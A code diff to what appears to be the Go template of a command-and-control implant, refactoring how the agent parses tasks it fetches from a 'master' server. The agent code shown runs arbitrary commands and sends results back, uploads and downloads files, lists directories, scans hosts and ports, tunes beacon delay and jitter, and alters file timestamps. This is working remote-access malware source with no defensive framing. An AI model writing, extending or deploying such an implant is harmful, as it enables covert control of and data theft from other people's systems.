@@ -424,9 +424,9 @@ func send() { //发送头部信息
 		    mutex.Unlock()
 		}`
         scan_func = `case "GET_U_FRIENDS":
-                        go scan_u_firends(msg[1], msg[2], msg[3], "ping")
+                        go scan_u_firends(shell, msg[2], msg[3], "ping")
                     case "GET_PORTS":
-                        go scan_u_firends(msg[1], msg[2], msg[3], "port")`
+                        go scan_u_firends(shell, msg[2], msg[3], "port")`
     }
 	protocol_var :="\""+protocol + "://\""
     s_server := "\""+server+"\""
@@ -670,7 +670,7 @@ func send() { //发送头部信息
         url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
         re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
         file_url := protocol + master + "//*Path*/?/*option*/=/*list*/"
-        var job, shell,taskid string
+        var job, shell string
         var msg []string
         for {
             delayMutex.RLock()
@@ -694,7 +694,7 @@ func send() { //发送头部信息
             if len(msg) < 2 {
                 continue
             }
-            job, taskid = msg[0], msg[len(msg)-1]
+            job = msg[0]
             msg_cmd := strings.Join(msg[:len(msg)-1], "*//*")
             if len(msg) > 1 {
                 shell = string(msg[1])
@@ -702,24 +702,24 @@ func send() { //发送头部信息
             switch job {
             /*scan_func*/
             case "GET_DELAY":
-                GET_DELAY(msg[1])
+                GET_DELAY(shell)
             case "GET_JITTER":
-                GET_JITTER(msg[1])
+                GET_JITTER(shell)
             case "GET_U_FILE":
-                go GET_U_FILE(msg[1], msg[2])
+                go GET_U_FILE(shell, msg[2])
             case "LOAD_U_FILE":
-                go downloadFile(msg[1])
+                go downloadFile(shell)
             case "LOOK_UP_FILE":
-                go listDir(shell, file_url,taskid)
+                go listDir(shell, file_url,msg[len(msg)-1])
             case "SWITCH_VERSION":
                 version = shell
             case "CHANG_FILE_NAME":
-                go CHANG_FILE_NAME(msg[1], msg[2])
+                go CHANG_FILE_NAME(shell, msg[2])
             case "CHANG_FILE_TIME":
-                go CHANG_FILE_TIME(msg[1], msg[2])
+                go CHANG_FILE_TIME(shell, msg[2])
             /*code*/
             default:
-                go get_Command(msg_cmd, re_url,taskid)
+                go get_Command(msg_cmd, re_url,msg[len(msg)-1])
             }
         }
     }
